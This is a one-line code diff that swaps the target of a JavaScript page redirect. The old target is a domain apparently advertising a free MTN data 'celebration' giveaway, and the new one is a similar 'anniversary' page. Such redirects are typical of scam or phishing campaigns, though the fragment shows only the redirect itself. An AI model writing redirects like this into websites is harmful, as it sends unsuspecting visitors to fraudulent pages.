@@ -1,1 +1,1 @@
-window.location.href = "https://www.grantoffer.xyz/mtn-25gb-celebration";
+window.location.href = "https://ibaidad.com/25-years.html";
